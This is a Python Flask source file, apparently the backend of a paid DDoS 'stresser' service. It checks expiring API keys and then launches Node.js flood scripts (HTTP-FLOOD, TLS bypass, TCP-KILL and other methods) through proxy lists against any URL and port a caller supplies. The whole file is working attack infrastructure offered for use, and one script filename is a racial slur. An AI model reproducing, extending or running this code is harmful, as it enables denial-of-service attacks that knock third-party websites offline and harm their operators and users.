from flask import Flask, request, jsonify
import subprocess
import threading
import datetime

app = Flask(__name__)

USER_FILE_PATH = 'user.txt'

def read_user_file(file_path):
    user_data = {}
    try:
        with open(file_path, 'r') as file:
            for line in file:
                key, expiration_date = line.strip().split(':')
                user_data[key] = expiration_date
    except FileNotFoundError:
        print(f"Không tìm thấy file: {file_path}")
    return user_data

def validate_api_key(key):
    user_data = read_user_file(USER_FILE_PATH)
    
    if key in user_data:
        expiration_date = user_data[key]
        current_date = datetime.datetime.now().strftime('%Y-%m-%d')
        
        if current_date <= expiration_date:
            return True, expiration_date
        else:
            print(f"API key hết hạn: {key}")
    else:
        print(f"API key không hợp lệ: {key}")

    return False, None

def authenticate_key(func):
    def wrapper(*args, **kwargs):
        key = request.args.get("key")
        is_valid, key_info = validate_api_key(key)
        if not is_valid:
            return jsonify({"error": "Invalid API key"}), 403
        return func(*args, key_info=key_info, **kwargs)
    return wrapper

@app.route('/api', methods=['GET'])
@authenticate_key
def execute_tool(key_info):
    try:
        methods = request.args.get('methods', 'Methods')
        url = request.args.get('url', '')
        time = request.args.get('time', '')        

        port = request.args.get('port', '')
        if not (methods and url and time and port):
            return jsonify({"Status": "error", "Noti": "Vui lòng nhập đầy đủ thông tin"}), 400

        valid_methods = [
            "HTTP-SMACK", "TLS-V2", "HTTP-FLOOD", "TLS-V1", "HTTP-RAND", "HTTP-RAW",
            "BYPASS-V4", "STORM-BYPASS", "HTTP-FREE", "HTTP-CRUSH",
            "TCP-KILL", "PROXY"
        ]
        if methods not in valid_methods:
            return jsonify({"Status": "error", "Noti": "Methods không tồn tại hoặc bị thiếu vui lòng nhập lại"}), 400
        def execute_command():
            if methods == "HTTP-SMACK":
                command = ['node', 'nigger.js', url, time, '80', '5', 'proxy.txt']
            elif methods == "TLS-V2":
                command = ['node', 'vip3.js', url, time, '5', 'proxy.txt', '64']
            elif methods == "TLS-V1":
                command = ['node', 'vip.js', url, time, '5', 'proxy.txt', '64']
            elif methods == "HTTP-FLOOD":
                command = ['node', '4.js', url, time, '64', '5', 'proxy.txt']
            elif methods == "HTTP-RAND":
                command = ['node', 'vip2.js',  url, time, '5', 'proxy.txt', '64']
            elif methods == "HTTP-RAW":
                command = ['node', '6.js',  url, time, '64', '5', 'proxy.txt']
            elif methods == "BYPASS-V4":
                command = ['node', 'http-load.js', url, time, '64', '5', 'proxy.txt']
            elif methods == "STORM-BYPASS":
                command = ['node', 'https.js', url, time, '64', '5', 'proxy.txt']
            elif methods == "HTTP-FREE":
                command = ['node', 'love.js', url, time, '5', 'proxy.txt', '64', '0']
            elif methods == "HTTP-CRUSH":
                command = ['node', 'TLSV1.js', url, time, '5', '64', 'proxy.txt', 'PRI']
            elif methods == "TCP-KILL":
                command = ['node', 'TLSV3.js', url, time, '5', '64', 'proxy.txt', 'PRI']
            elif methods == "PROXY":
                command = ['python', 'proxy.py']
            else:
                print(f"Phương thức không xác định: {methods}")
                return

            try:
                result = subprocess.run(command, capture_output=True, text=True, timeout=180)
                print(result.stdout)
                print(result.stderr)
            except subprocess.TimeoutExpired:
                print("Lệnh thực thi đã hết thời gian.")
            except Exception as e:
                print(f"Lỗi khi thực thi lệnh: {e}")

        threading.Thread(target=execute_command).start()

        result = {
            'Status': 'Success',
            'time': time,
            'Url': url,
            'Methods': methods,
            'Port': port,
            'Owner': 'Van_trong',
            'key': key_info
        }

        return jsonify(result)
    except Exception as e:
        print(e)
        return jsonify({'error': 'Lỗi máy chủ nội bộ'}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)